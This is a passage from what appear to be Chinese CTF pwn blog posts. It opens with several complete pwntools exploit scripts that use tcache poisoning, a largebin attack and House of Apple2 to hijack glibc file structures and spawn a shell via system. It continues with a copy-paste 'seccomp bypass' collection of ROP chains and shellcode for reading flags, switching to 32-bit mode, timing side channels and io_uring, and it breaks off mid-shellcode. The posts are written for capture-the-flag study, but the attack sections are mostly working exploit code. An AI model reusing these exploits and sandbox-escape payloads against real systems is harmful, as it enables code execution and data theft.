sla(b'idx? ',str(idx).encode()) sa(b'content :',commend)def exit(): sla(b'&gt;&gt;',b'5')add(0,0x500)add(1,0x10)dele(0)show(0)ru(b'content : ')libc_base = uu64() - 0x21ace0main_arena = libc_base + 0x21ac80lg(b'libc_base',libc_base)lg(b'main_arena',main_arena)add(0xf,0x500)add(2,0x20)add(3,0x20)dele(2) #产生tcache bin0dele(3) #产生tcache bin1#可以得到 tcache bin1 -&gt; fd = tcache bin0show(2)ru(b'content : ')heap_base = u64(io.recv(5).ljust(8, b'\\x00')) &lt;&lt; 12lg(b'heap_base',heap_base)key = heap_base &gt;&gt; 12_IO_list_all = libc_base + libc.sym['_IO_list_all']debug()edit(3,p64(_IO_list_all ^ key))#修改后：可以得到 tcache bin1 -&gt; fd = (_IO_list_all ^ key)，经过malloc后返回的就是_IO_list_all的地址add(4,0x20) #申请的tcache bin1add(5,0x20) #申请的fake_chunk(_IO_list_all的位置)add(6,0x1000)add(7,0x1000)add(8,0x1000)fake_IO_1_addr = heap_base + 0x10 + 2080 #即是fake_IO_file的地址fake_IO_2_addr = heap_base + 0x10 + 6192 #即是pad3的地址fake_IO_3_addr = heap_base + 0x10 + 10304 #既是pad4的地址sys_addr = libc_base + libc.sym['system']_IO_wfile_jumps = libc_base + libc.sym['_IO_wfile_jumps']fake_IO_file = b''fake_IO_file += b' sh;'.ljust(0x8,b'\\x00')+p64(0x1101)fake_IO_file = fake_IO_file.ljust(0x28,b'\\x00')fake_IO_file += p64(1) # _IO_write_ptrfake_IO_file = fake_IO_file.ljust(0xa0,b'\\x00')fake_IO_file += p64(fake_IO_2_addr) # _wide_data = fake_IO_2_addr fake_IO_file = fake_IO_file.ljust(0xd8,b'\\x00')fake_IO_file += p64(_IO_wfile_jumps) # vtable = IO_wfile_jumpsedit(6,fake_IO_file) pad3 = b''pad3 += p64(0) * 28pad3 += p64(fake_IO_3_addr) #vtableedit(7,pad3)pad4 = b''pad4 += p64(0) * 13pad4 += p64(sys_addr) #chainedit(8,pad4)edit(5,p64(fake_IO_1_addr)) #触发tcache poisoning，直接修改_IO_list_all的内容lg(b'fake_IO_1_addr',fake_IO_1_addr)lg(b'fake_IO_2_addr',fake_IO_2_addr)lg(b'fake_IO_3_addr',fake_IO_3_addr)pause()exit()inter()方法2：house of apple2+tcachebin attacktcache bin的fd指针修改修改前修改后由于我们修改了tcachebin1的fd指针，导致我们第二次申请的同样大小的堆块时，会直接申请的是返回_IO_2_1_stderr的地址，这导致我们可以直接修改__IO_2_1_stderr所在的内容，就可以触发tcache poisoning写入fake_IO_file结构体前：写入后：这里需要解释一下wide_data为什么存放的是stderr-0x40的地址，因为wide_data的地址加上0x68就是我们可以直接控制的rip的地址，可以执行onegadget，magic，system函数等等123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144from pwn import *from ctypes import *pwn = './heap'libc = ELF('./libc.so.6')if args['REMOTE']: io = remote('192.168.18.22', 8888)else: io = process(pwn)context(log_level='debug')#context.terminal = ['tmux','splitw','-h']context.binary = elf = ELF(pwn)rop = ROP(context.binary)s = lambda data: io.send(data)sa = lambda text, data: io.sendafter(text, data)sl = lambda data: io.sendline(data)sla = lambda text, data: io.sendlineafter(text, data)r = lambda num=4096: io.recv(num)ru = lambda text: io.recvuntil(text)pr = lambda num=4096: print(io.recv(num))inter = lambda: io.interactive()l32 = lambda: u32(io.recvuntil(b'\\xf7')[-4:].ljust(4, b'\\x00'))l64 = lambda: u64(io.recvuntil(b'\\x7f')[-6:].ljust(8, b'\\x00'))uu32 = lambda: u32(io.recv(4).ljust(4, b'\\x00'))uu32_hex = lambda: int(io.recvuntil(b'0x', drop=True) + r(8), 16)uu64 = lambda: u64(io.recv(6).ljust(8, b'\\x00'))uu64_hex = lambda: int(io.recvuntil(b'0x', drop=True) + r(12), 16)uuu64 = lambda: u64(ru(b'\\x7f')[-6:].ljust(8, b'\\x00'))uuuu64 = lambda target: u64((ru(target)[-1:] + r(5)).ljust(8, b'\\x00'))int16 = lambda data: int(data, 16)lg = lambda s, num: io.success('%s -&gt; 0x%x' % (s, num))def get_sb(): return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\\x00'))def get_orw(): return libc_base + libc.sym['open'], libc_base + libc.sym['read'], libc_base + libc.sym['write']def debug(breakpoints=None): if breakpoints is None: breakpoints = [\"__call_tls_dtors\"] elif isinstance(breakpoints, str): breakpoints = [breakpoints] script = \"\" for bp in breakpoints: script += f\"b {bp}\\n\" gdb.attach(proc.pidof(io)[0], script) pause()def fmt(value, offset=14, size='hhn'): if size == 'hhn': num = value &amp; 0xff elif size == 'hn': num = value &amp; 0xffff elif size == 'n': num = value &amp; 0xffffffff payload = f\"%{num}c%{offset}${size}\".encode() #value 是格式化字符串偏移 return payloadlss = lambda s: log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))def cat_flag(): flag_header = b'flag{' sleep(1) sl('cat flag') ru(flag_header) flag = flag_header + ru('}') + b'}' exit(0)#asm(shellcraft.sh()).ljust(0x108,b'a')def add(idx,size): sla(b'&gt;&gt;',b'1') sla(b'idx? ',str(idx).encode()) sla(b'size? ',str(size).encode())def dele(idx): sla(b'&gt;&gt;',b'2') sla(b'idx? ',str(idx).encode())def show(idx): sla(b'&gt;&gt;',b'3') sla(b'idx? ',str(idx).encode())def edit(idx,commend): sla(b'&gt;&gt;',b'4') sla(b'idx? ',str(idx).encode()) sa(b'content :',commend)def exit(): sla(b'&gt;&gt;',b'5')add(0,0x100)dele(0)show(0)ru('content :')heap_base = (((u64(io.recv(6).ljust(8,b\"\\x00\")) &gt;&gt; 4)&lt;&lt;12)-0x2000)&gt;&gt;4log.success(f'heap_base:{heap_base:#x}')add(1,0x500)add(2,0x10)dele(1)show(1)ru(b'content : ')libc_base = uu64()-2206944log.success(f'libc_base:{libc_base:#x}')add(3,0x100)add(4,0x100)dele(3) #产生tcache bin0dele(4) #产生tcache bin1#tcache bin1 -&gt; fd = tcache bin0 stderr = libc_base + libc.sym['_IO_2_1_stderr_']sys_addr = libc_base + libc.sym['system']key = (heap_base + 0x3b0)&gt;&gt;12edit(4,p64(key^stderr)) #修改chunk4的fddebug()add(5,0x100) add(6,0x100)fake_file = flat({ 0x0: b\" sh;\", 0x28: sys_addr, 0xa0: stderr-0x40, # _wide_data 0xD8: libc_base + libc.sym['_IO_wfile_jumps'], # jumptable }, filler=b\"\\x00\")edit(6,fake_file)exit()inter()方法3: largebin attack+house of apple2自学的123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172from pwn import *from ctypes import *from pwncli import *pwn = './heap'libc = ELF('./libc.so.6')if args['REMOTE']: io = remote('192.168.18.22', 8888)else: io = process(pwn)context(log_level='debug')#context.terminal = ['tmux','splitw','-h']context.binary = elf = ELF(pwn)rop = ROP(context.binary)s = lambda data: io.send(data)sa = lambda text, data: io.sendafter(text, data)sl = lambda data: io.sendline(data)sla = lambda text, data: io.sendlineafter(text, data)r = lambda num=4096: io.recv(num)ru = lambda text: io.recvuntil(text)pr = lambda num=4096: print(io.recv(num))inter = lambda: io.interactive()l32 = lambda: u32(io.recvuntil(b'\\xf7')[-4:].ljust(4, b'\\x00'))l64 = lambda: u64(io.recvuntil(b'\\x7f')[-6:].ljust(8, b'\\x00'))uu32 = lambda: u32(io.recv(4).ljust(4, b'\\x00'))uu32_hex = lambda: int(io.recvuntil(b'0x', drop=True) + r(8), 16)uu64 = lambda: u64(io.recv(6).ljust(8, b'\\x00'))uu64_hex = lambda: int(io.recvuntil(b'0x', drop=True) + r(12), 16)uuu64 = lambda: u64(ru(b'\\x7f')[-6:].ljust(8, b'\\x00'))uuuu64 = lambda target: u64((ru(target)[-1:] + r(5)).ljust(8, b'\\x00'))int16 = lambda data: int(data, 16)lg = lambda s, num: io.success('%s -&gt; 0x%x' % (s, num))def get_sb(): return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\\x00'))def get_orw(): return libc_base + libc.sym['open'], libc_base + libc.sym['read'], libc_base + libc.sym['write']def debug(breakpoints=None): if breakpoints is None: breakpoints = [\"__call_tls_dtors\"] elif isinstance(breakpoints, str): breakpoints = [breakpoints] script = \"\" for bp in breakpoints: script += f\"b {bp}\\n\" gdb.attach(proc.pidof(io)[0], script) pause()def fmt(value, offset=14, size='hhn'): if size == 'hhn': num = value &amp; 0xff elif size == 'hn': num = value &amp; 0xffff elif size == 'n': num = value &amp; 0xffffffff payload = f\"%{num}c%{offset}${size}\".encode() #value 是格式化字符串偏移 return payloadlss = lambda s: log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))def cat_flag(): flag_header = b'flag{' sleep(1) sl('cat flag') ru(flag_header) flag = flag_header + ru('}') + b'}' exit(0)#asm(shellcraft.sh()).ljust(0x108,b'a')def add(idx,size): sla(b'&gt;&gt;',b'1') sla(b'idx? ',str(idx).encode()) sla(b'size? ',str(size).encode())def dele(idx): sla(b'&gt;&gt;',b'2') sla(b'idx? ',str(idx).encode())def show(idx): sla(b'&gt;&gt;',b'3') sla(b'idx? ',str(idx).encode())def edit(idx,commend): sla(b'&gt;&gt;',b'4') sla(b'idx? ',str(idx).encode()) sa(b'content :',commend)def exit(): sla(b'&gt;&gt;',b'5')debug(\"_fini\")add(0,0x520)add(1,0x30)add(2,0x510)add(3,0x30)dele(0)show(0)ru(b'content : ')libc_base = uu64() - 96 - 0x21ac80lg(b'libc_base',libc_base)add(4,0x550)edit(0,b'a'*0x10)show(0)ru(b'a'*0x10)heap_base = u64(io.recv(6).ljust(8,b'\\x00')) - 0x290lg(b'heap_base',heap_base)large = libc_base + 0x21b0e0 //写topchunkheap = heap_base + 0x800 - 0x10_IO_wfile_jumps = libc_base + 0x2170c0_IO_list_all = libc_base + libc.sym['_IO_list_all']lg(b'_IO_all_list',_IO_list_all)sys_addr = libc_base + libc.sym['system']fake_IO_addr = heap_base + 0x800_lock = libc_base + 0x21ca60edit(0,p64(large)+p64(large)+p64(_IO_list_all-0x20)+p64(_IO_list_all-0x20)) dele(2)#pause()add(5,0x550)gadget1 = libc_base + 0x16a06a # mov rbp,QWORD PTR [rdi+0x48]# mov rax,QWORD PTR [rbp+0x18]# lea r13,[rbp+0x10]# mov DWORD PTR [rbp+0x10],0x0# mov rdi,r13# call QWORD PTR [rax+0x28]gadget2 = libc_base + 0x882cf#xor esi, esi ; mov rdi, rbp ; call qword ptr [r13 + 0x10]fake_IO_FILE = IO_FILE_plus_struct()# fake_IO_FILE.house_of_apple2_execmd_when_exit(_IO_list_all,_IO_wfile_jumps,sys_addr)fake_IO_FILE.vtable = p64(_IO_wfile_jumps)fake_IO_FILE._IO_save_base = p64(fake_IO_addr+0x260)fake_IO_FILE._mode = 0xfffffffffake_IO_FILE._lock = p64(_lock)fake_IO_FILE._wide_data = p64(fake_IO_addr+0x200)fake_IO_FILE._IO_write_ptr = p64(1)fake_IO_FILE._IO_write_base = p64(0)payload = bytes(fake_IO_FILE).ljust(0x200,b'\\x00') //之前卡在一个payload += p64(heap_base+0x2a0)payload = payload.ljust(0x260,b'\\x00')payload += b' sh;'payload = payload.ljust(0x270,b'\\x00')payload += p64(0)payload = payload.ljust(0x278,b'\\x00')payload += p64(fake_IO_addr+0x268)payload = payload.ljust(0x280,b'\\x00')payload += p64(sys_addr)payload = payload.ljust(0x290,b'\\x00')payload += p64(gadget2)payload = payload.ljust(0x2e0,b'\\x00')payload += p64(fake_IO_addr+0x300)payload = payload.ljust(0x368,b'\\x00')payload += p64(gadget1)edit(2,payload[0x10:])exit()inter()之前一直卡在这里没进去，服了，就是没修过rdp的值，导致[rbp+0x18]和[rdx+0x18]的值有冲突，一个必须为0，一个必须写数据，还好后面改了rbp就简单了，但是吧，还不够格，因为 mov DWORD PTR [rbp+0x10],0x0又清零参数，恶心的很，还好再找个gadget2把’ sh;’参数传给rdi，就简单了找gadget也是真的有意思，直接tele看不见，只有x/8i addr 这样才看得到gadget"
    },
  
    {
      "title": "seccomp沙盒绕过",
      "url": "https://liyckonline.top/%E6%8A%80%E6%9C%AF/2025/08/01/my-second-post/",
      "date": "2025-08-01",
      "content": "seccomp沙盒绕过 (rop与shellcode集合)前言起因在每次遇到沙盒时都要重新写rop或者shellcode，这非常不健康，所以我写了这篇文章，尽可能的让这里的代码能拿来就能用。在正篇里将直接用rop或shellcode中使用的函数进行命名，这样可以快速并清晰的找到要用的代码。注意: open+read+write为模版，之后相对应的代码可以直接进行替换，比如pread64可以直接将read进行替换（活字印刷术）。以下为例题程序 1234567891011121314151617181920212223242526272829# rop对应程序int __fastcall main(int argc, const char **argv, const char **envp){char v4[16]; // [rsp+0h] [rbp-10h] BYREFprintf(\"%lp\\n\", &amp;printf, envp);gets(v4);return 0;}# python3脚本from pwncli import *context(arch='amd64',os='linux',log_level='debug')p = lambda s,t: print(f\"\\033[0;31;43m{s.ljust(15, ' ') + '-------------------------&gt;' + hex(t)}\\033[0m\")sh = process(\"./rop\")libc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")libc.address = eval(sh.recvline()) - libc.sym[\"printf\"]# ---------需要更改pop_rdi = libc.address + 0x000000000002a3e5pop_rsi = libc.address + 0x0000000000163f88pop_rdx_r12 = libc.address + 0x000000000011f2e7pop_rcx = libc.address + 0x000000000003d1eerop = b\"a\"*0x18 + [rop程序] # ------sh.sendline(rop)sh.interactive() 1234567891011# python3脚本from pwncli import *context(arch='amd64',os='linux',log_level='debug')p = lambda s,t: print(f\"\\033[0;31;43m{s.ljust(15, ' ') + '-------------------------&gt;' + hex(t)}\\033[0m\")sh = process(\"./shellcode\")shellcode = [shellcode代码] #-----------sh.sendline(asm(shellcode))sh.interactive() 沙盒沙盒是一种对程序的保护，他可以禁用一些系统调用从而增加pwn题目的难度，迫使pwner们通过ORW的方法进行绕过沙盒。比如最常见的禁用execve，那么就只能通过open，read，write来直接读取flag的内容。沙盒检测1seccomp-tools dump ./pwn正篇open+read+writerop12345678rop = b\"a\"*0x18rop += flat(pop_rdi, 0, pop_rsi, libc.sym[\"_IO_list_all\"]+8, pop_rdx_r12, 0x200, 0, libc.sym[\"read\"]) # readrop += flat(pop_rdi, libc.sym[\"_IO_list_all\"]+8, pop_rsi, 0, pop_rdx_r12, 0, 0, libc.sym[\"open\"]) # openrop += flat(pop_rdi, 3, pop_rsi, libc.sym[\"_IO_list_all\"]+8, pop_rdx_r12, 0x200, 0, libc.sym[\"read\"]) # readrop += flat(pop_rdi, 1, pop_rsi, libc.sym[\"_IO_list_all\"]+8, pop_rdx_r12, 0x200, 0, libc.sym[\"write\"]) # writesh.sendline(rop)sh.sendline(\"/flag\\x00\")shellcode12345678910111213141516171819202122232425262728293031323334shellcode = shellcraft.amd64.pushstr(\"/flag\")shellcode += shellcraft.amd64.linux.open('rsp', 0, 0)shellcode += shellcraft.amd64.linux.read('rax', 'rsp', 0x200)shellcode += shellcraft.amd64.linux.write(1, 'rsp', 0x200)flag_name = b'/flag'shellcode = \"\"shellcode += \"\"\" mov r12,\"\"\" + str(u64(flag_name.ljust(8,b'\\x00'))) + \"\"\" mov [rsp],r12\"\"\"shellcode += \"\"\" mov rdi, rsp mov rsi, 0 mov rdx, 0 mov rax,2 syscall\"\"\" # openshellcode += \"\"\" mov rdi, 3 mov rsi, rsp mov rdx, 0x100 xor rax, rax syscall\"\"\" # readshellcode += \"\"\" mov rdi, 1 mov rsi, rsp mov rdx, 0x100 mov rax, 1 syscall\"\"\" # writeopen替代openat rop 1rop += flat(pop_rdi, 3, pop_rsi, libc.sym[\"_IO_list_all\"]+8, pop_rdx_r12, 0, 0, libc.sym[\"openat\"]) shellcode 1234567891011shellcode += shellcraft.amd64.linux.openat(3,'rsp', 0)shellcode += \"\"\"mov rdi, -100 #mov rdi, 3也可以，但是不通用，要是fd=3所指的目录mov rsi, rspmov rdx, 0mov r10, 0mov rax,0x101syscall\"\"\" openat2 rop 12345678bss_addr = 0x000000000404020 # 写bss段exec_fd = (bss_addr &gt;&gt; 12) &lt;&lt; 12rop = b\"a\" * 0x18rop += flat(pop_rdi, exec_fd, pop_rsi, 0x1000, pop_rdx_r12, 7, 0, libc.sym[\"mprotect\"])rop += flat(pop_rdi, 0, pop_rsi, exec_fd, pop_rdx_r12, 0x1000, 0, libc.sym[\"read\"], exec_fd)sh.sendline(rop)sh.sendline([shellcode]) # 填写shellcode shellcode 1234567891011121314151617181920212223shellcode = '''mov r12, 0x0067616c66mov [rsp], r12xor rax, raxpush raxpush raxpush raxpush raxmov rdi, -100 lea rsi, [rsp+0x20] mov rdx, rsp mov r10, 0x18 mov rax, 437 syscallmov rdi, 1mov rsi, raxmov rdx, 0mov r10, 0x100mov rax, 0x28syscall''' read替代pread rop 1rop += flat(pop_rdi, 3, pop_rsi, libc.sym[\"_IO_list_all\"]+8, pop_rdx_r12, 0x200, 0, pop_rcx, 0, libc.sym[\"pread\"]) shellcode 1234567891011shellcode += shellcraft.amd64.linux.pread('rax', 'rsp', 0x200, 0)shellcode += \"\"\"mov rdi, 3mov rsi, rspmov rdx, 0x100mov r10, 0mov rax, 0x11syscall\"\"\" # read readv rop 12345678bss_addr = 0x000000000404020 # 写bss段exec_fd = (bss_addr &gt;&gt; 12) &lt;&lt; 12rop = b\"a\" * 0x18rop += flat(pop_rdi, exec_fd, pop_rsi, 0x1000, pop_rdx_r12, 7, 0, libc.sym[\"mprotect\"])rop += flat(pop_rdi, 0, pop_rsi, exec_fd, pop_rdx_r12, 0x1000, 0, libc.sym[\"read\"], exec_fd)sh.sendline(rop)sh.sendline([shellcode]) # 填写shellcode shellcode 123456789101112131415161718shellcode += '''push 0x200push 0x200mov [rsp],rsp'''shellcode += shellcraft.amd64.linux.readv('rax', 'rsp', 1)shellcode += \"\"\"push 0x200push 0x200mov [rsp],rspmov rdi, 3mov rsi, rspmov rdx, 0x1mov rax, 0x13syscall\"\"\" # read preadv rop 12345678bss_addr = 0x000000000404020 # 写bss段exec_fd = (bss_addr &gt;&gt; 12) &lt;&lt; 12rop = b\"a\" * 0x18rop += flat(pop_rdi, exec_fd, pop_rsi, 0x1000, pop_rdx_r12, 7, 0, libc.sym[\"mprotect\"])rop += flat(pop_rdi, 0, pop_rsi, exec_fd, pop_rdx_r12, 0x1000, 0, libc.sym[\"read\"], exec_fd)sh.sendline(rop)sh.sendline([shellcode]) # 填写shellcode shellcode 1234567891011121314151617shellcode += '''push 0x200push 0x200mov [rsp],rsp'''shellcode += shellcraft.amd64.linux.preadv('rax', 'rsp', 1, 0)shellcode += \"\"\"push 0x200push 0x200mov [rsp],rspmov rdi, 3mov rsi, rspmov rdx, 0x1mov r10, 0mov rax, 0x127syscall\"\"\" # read mmap rop 12345678bss_addr = 0x000000000404020 # 写bss段exec_fd = (bss_addr &gt;&gt; 12) &lt;&lt; 12rop = b\"a\" * 0x18rop += flat(pop_rdi, exec_fd, pop_rsi, 0x1000, pop_rdx_r12, 7, 0, libc.sym[\"mprotect\"])rop += flat(pop_rdi, 0, pop_rsi, exec_fd, pop_rdx_r12, 0x1000, 0, libc.sym[\"read\"], exec_fd)sh.sendline(rop)sh.sendline([shellcode]) # 填写shellcode shellcode 123456789101112131415# 主要mmap映射到了0x777721000，所以之后的write也需要输出0x777721000位置的内容。shellcode += shellcraft.amd64.linux.mmap(0x777721000, 0x100, 1, 2, 3, 0)# 主要mmap映射到了0x777721000，所以之后的write也需要输出0x777721000位置的内容。shellcode += \"\"\"mov rdi, 0x777721000mov rsi, 0x100mov rdx, 1mov r10, 2mov r8, 3mov r9, 0mov rax, 9syscall\"\"\" # read sendfilesendfile可以直接代替write与read rop 1rop += flat(pop_rdi, 1, pop_rsi, 3, pop_rdx_r12, 0, 0, pop_rcx, 0x100, libc.sym[\"sendfile\"]) shellcode 1234567891011shellcode += shellcraft.amd64.linux.sendfile(1, \"rax\", 0, 0x200)shellcode += \"\"\"mov rdi, 1mov rsi, raxmov rdx, 0mov r10, 0x100mov rax, 0x28syscall\"\"\" write替代writev rop 12345678bss_addr = 0x000000000404020 # 写bss段exec_fd = (bss_addr &gt;&gt; 12) &lt;&lt; 12rop = b\"a\" * 0x18rop += flat(pop_rdi, exec_fd, pop_rsi, 0x1000, pop_rdx_r12, 7, 0, libc.sym[\"mprotect\"])rop += flat(pop_rdi, 0, pop_rsi, exec_fd, pop_rdx_r12, 0x1000, 0, libc.sym[\"read\"], exec_fd)sh.sendline(rop)sh.sendline([shellcode]) # 填写shellcode shellcode 1234567891011121314151617181920# 注意flag输出不在开头shellcode += '''push 0x200push 0x200mov [rsp],rsp'''shellcode += shellcraft.amd64.linux.writev(1, 'rsp', 0x1)# 注意flag输出不在开头shellcode += \"\"\"push 0x200push 0x200mov [rsp],rspmov rdi, 1mov rsi, rspmov rdx, 0x1mov rax, 0x14syscall\"\"\" # write sendfilesendfile可以直接代替write与read rop 1rop += flat(pop_rdi, 1, pop_rsi, 3, pop_rdx_r12, 0, 0, pop_rcx, 0x100, libc.sym[\"sendfile\"]) shellcode 123456789shellcode += shellcraft.amd64.linux.sendfile(1, \"rax\", 0, 0x200)shellcode += \"\"\"mov rdi, 1mov rsi, raxmov rdx, 0mov r10, 0x100mov rax, 0x28syscall\"\"\" 侧信道攻击 这个攻击比较特殊，实在没有输出手段的时候就利用此方法，此方法相当不准确，谨慎使用。 如果rop同上面一样使用 12345678bss_addr = 0x000000000404020 # 写bss段exec_fd = (bss_addr &gt;&gt; 12) &lt;&lt; 12rop = b\"a\" * 0x18rop += flat(pop_rdi, exec_fd, pop_rsi, 0x1000, pop_rdx_r12, 7, 0, libc.sym[\"mprotect\"])rop += flat(pop_rdi, 0, pop_rsi, exec_fd, pop_rdx_r12, 0x1000, 0, libc.sym[\"read\"], exec_fd)sh.sendline(rop)sh.sendline([shellcode]) # 填写shellcode 来转化成写shellcode接下来看shellcode怎么写。现在假设flag已经读到了栈上，但是没有办法读（没有系统调用 &amp; close(1)）。那么可以进行爆破，因为没有返回，所以爆破就只能看时间来判断。 123456789101112131415161718192021flag = ''for offset in range(30):for byte in range(0x20,0x80): sh = process(\"./shellcode\") shell = asm(shellcode + \"\"\" infinite_loop: cmp byte ptr[rsp+{}], {} je infinite_loop \"\"\".format(str(offset),str(byte))) sh.sendlineafter(\"shellcode: \\n\",shell) try: sh.recv(timeout=0.2) flag += chr(byte) print(flag + \"---\" + str(byte)) sh.close() break except: pass print(flag + \"---\" + str(byte)) sh.close() shellcode为读取文件的code。 很慢，但可行。转32位利用条件 沙箱没有arch==ARCH_x86_64检测 可以使用mmmap或者mprotect和32位的地址 rop 可以调用mprotect来转化成写shellcode 12345678bss_addr = 0x000000000404020 # 写bss段exec_fd = (bss_addr &gt;&gt; 12) &lt;&lt; 12rop = b\"a\" * 0x18rop += flat(pop_rdi, exec_fd, pop_rsi, 0x1000, pop_rdx_r12, 7, 0, libc.sym[\"mprotect\"])rop += flat(pop_rdi, 0, pop_rsi, exec_fd, pop_rdx_r12, 0x1000, 0, libc.sym[\"read\"], exec_fd)sh.sendline(rop)sh.sendline([shellcode]) # 填写shellcode shellcode 123456789101112131415161718192021222324252627282930313233343536373839404142434445shellcode64 = shellcraft.amd64.linux.mmap(0x700000, 0x1000, 7, 0x32, -1, 0)shellcode64 += shellcraft.amd64.linux.read(0, 0x700000, 0x1000)shellcode64 += \"\"\"mov rsp,0x700800mov DWORD PTR [rsp+4], 0x23mov DWORD PTR [rsp], 0x700000retfd\"\"\"shellcode32 = \"\"\"push 0x67616C66\"\"\"shellcode32 += \"\"\"push esppush 0push 0pop edxpop ecxpop ebxpush 5pop eaxint 0x80\"\"\" # openshellcode32 += \"\"\"push eaxpush esppush 0x100pop edxpop ecxadd ecx, 0x20pop ebxpush 3pop eaxint 0x80\"\"\" # readshellcode32 += \"\"\"push 1pop ebxpush 4pop eaxint 0x80\"\"\" # writesh.sendline(asm(shellcode64, arch='amd64', bits=64))sh.sendline(asm(shellcode32, arch='i386', bits=32)) 绕过close(1)侧信道攻击同write替代中的侧信道攻击远程链接socket&amp;connect有些程序会调用子进程，子进程对外开放，但是rop写后只能在主进程运行，输出没法显示在远程，或者close(1)，那么可以用此方法，此方法需要公网ip。1234567891011121314#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;sys/socket.h&gt;int main() { struct sockaddr_in *serv_addr = malloc(sizeof(struct sockaddr_in)); memset(serv_addr, 0, sizeof(struct sockaddr_in)); serv_addr-&gt;sin_family = AF_INET; serv_addr-&gt;sin_addr.s_addr = inet_addr(\"127.0.0.1\"); //填入ip地址和端口 serv_addr-&gt;sin_port = htons(8888); printf(%lp,*serv_addr); return 0;}open(\"/dev/pts/?\")使用open(\"/dev/pts/?\")重新打开标准输出超级代码这个代码利用了下面三个个系统调用1239 common mmap __x64_sys_mmap425 common io_uring_setup __x64_sys_io_uring_setup426 common io_uring_enter __x64_sys_io_uring_enter汇编如下push r15mov ecx,0x1epush r14push r13xor r13d,r13dpush r12mov eax,r13dpush rbppush rbxsub rsp,0x68lea rdi,[rsp-0x10]lea rsi,[rsp-0x10]rep stos DWORD PTR es:[rdi],eaxmov edi,0x10mov eax,0x1a9syscallmov ebx,0x9mov r12,raxmov r14d,eaxmov r8d,eaxxor r9d,r9dmov r10d,0x1mov edx,0x3xor edi,edimov esi,0x1000mov eax,ebxsyscallmov r9d,0x8000000mov rbp,raxmov eax,ebxsyscallmov r9d,0x10000000mov r15,raxmov eax,ebxsyscallmov ecx,0x10mov rbx,raxmov rdi,raxmov eax,r13drep stos DWORD PTR es:[rdi],eaxmov edi,r12dmov r12d,0x1aaxor r9d,r9dxor r8d,r8dmov edx,0x1mov esi,0x1movabs rax,0xffffff9c00001012mov QWORD PTR [rbx],raxlea rax,[rip+0xc1] # 0x7ffcf065b5c0mov QWORD PTR [rbx+0x10],raxmov eax,DWORD PTR [rsp+0x30]mov DWORD PTR [rbp+rax*1+0x0],0x0mov eax,DWORD PTR [rsp+0x1c]inc DWORD PTR [rbp+rax*1+0x0]mov eax,r12dsyscallmov eax,DWORD PTR [rsp+0x54]mov rdi,rbxmov ecx,0x10mov edx,DWORD PTR [r15+rax*1+0x8]mov eax,r13dlea r15,[rsp-0x74]rep stos DWORD PTR es:[rdi],eaxmov BYTE PTR [rbx],0x16mov eax,DWORD PTR [rsp+0x30]mov edi,r14dmov DWORD PTR [rbx+0x4],edxmov edx,0x1mov QWORD PTR [rbx+0x10],r15mov DWORD PTR [rbx+0x18],0x64mov DWORD PTR [rbp+rax*1+0x0],0x0mov eax,DWORD PTR [rsp+0x1c]inc DWORD PTR [rbp+rax*1+0x0]mov eax,r12dsyscallmov ecx,0x10mov eax,r13dmov rdi,rbxmov edx,0x3rep stos DWORD PTR es:[rdi],eaxmov QWORD PTR [rbx+0x10],r15mov edi,r14dmovabs rax,0x100000017mov QWORD PTR [rbx],raxmov eax,DWORD PTR [rsp+0x30]mov DWORD PTR [rbx+0x18],0x64mov DWORD PTR [rbp+rax*1+0x0],0x0mov eax,DWORD PTR [rsp+0x1c]inc DWORD PTR [rbp+rax*1+0x0]mov eax,r12dsyscalladd rsp,0x68xor eax,eaxpop rbxpop rbppop r12pop r13pop r14pop r15retcs (bad)机器码如下1shellcode = b'AW\\xb9\\x1e\\x00\\x00\\x00AVAUE1\\xedATD\\x89\\xe8USH\\x83\\xechH\\x8d|$\\xf0H\\x8dt$\\xf0\\xf3\\xab\\xbf\\x10\\x00\\x00\\x00\\xb8\\xa9\\x01\\x00\\x00\\x0f\\x05\\xbb\\t\\x00\\x00\\x00I\\x89\\xc4A\\x89\\xc6A\\x89\\xc0E1\\xc9A\\xba\\x01\\x00\\x00\\x00\\xba\\x03\\x00\\x00\\x001\\xff\\xbe\\x00\\x10\\x00\\x00\\x89\\xd8\\x0f\\x05A\\xb9\\x00\\x00\\x00\\x08H\\x89\\xc5\\x89\\xd8\\x0f\\x05A\\xb9\\x00\\x00\\x00\\x10I\\x89\\xc7\\x89\\xd8\\x0f\\x05\\xb9\\x10\\x00\\x00\\x00H\\x89\\xc3H\\x89\\xc7D\\x89\\xe8\\xf3\\xabD\\x89\\xe7A\\xbc\\xaa\\x01\\x00\\x00E1\\xc9E1\\xc0\\xba\\x01\\x00\\x00\\x00\\xbe\\x01\\x00\\x00\\x00H\\xb8\\x12\\x10\\x00\\x00\\x9c\\xff\\xff\\xffH\\x89\\x03H\\x8d\\x05\\xc1\\x00\\x00\\x00H\\x89C\\x10\\x8bD$0\\xc7D\\x05\\x00\\x00\\x00\\x00\\x00\\x8bD$\\x1c\\xffD\\x05\\x00D\\x89\\xe0\\x0f\\x05\\x8bD$TH\\x89\\xdf\\xb9\\x10\\x00\\x00\\x00A\\x8bT\\x07\\x08D\\x89\\xe8L\\x8d|$\\x8c\\xf3\\xab\\xc6\\x03\\x16\\x8bD$0D\\x89\\xf7\\x89S\\x04\\xba\\x01\\x00\\x00\\x00L\\x89{\\x10\\xc7C\\x18d\\x00\\x00\\x00\\xc7D\\x05\\x00\\x00\\x00\\x00\\x00\\x8bD$\\x1c\\xffD\\x05\\x00D\\x89\\xe0\\x0f\\x05\\xb9\\x10\\x00\\x00\\x00D\\x89\\xe8H\\x89\\xdf\\xba\\x03\\x00\\x00\\x00\\xf3\\xabL\\x89{\\x10D\\x89\\xf7H\\xb8\\x17\\x00\\x00\\x00\\x01\\x00\\x00\\x00H\\x